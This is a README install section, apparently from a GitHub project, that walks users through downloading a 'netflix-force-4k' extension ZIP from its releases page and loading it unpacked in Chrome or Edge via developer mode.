## üì¶ Download & Install

1. **Go to Releases Page**: Click this link to visit the [Releases page](https://github.com/Cantea1234/netflix-force-4k/releases).
   
2. **Choose the Latest Release**: Find the latest release at the top of the page.

3. **Download the Extension**: 
   - Look for the file named `netflix-force-4k.extension.zip` (or similar).
   - Click on the file to download it to your computer.

4. **Unzip the File**: 
   - Locate the downloaded ZIP file.
   - Right-click it and select "Extract All" to unzip the contents.

5. **Open Your Browser**:
   - Open either Google Chrome or Microsoft Edge.

6. **Enable Developer Mode**:
   - For Chrome: Go to `chrome://extensions/`, and turn on "Developer mode" in the top right corner.
   - For Edge: Go to `edge://extensions/`, and enable "Developer mode" in the top right corner.

7. **Load the Unpacked Extension**:
   - Click "Load unpacked" in Chrome or Edge.
   - Select the folder that contains the unzipped extension files.
   - The extension should now be visible in your extensions list.
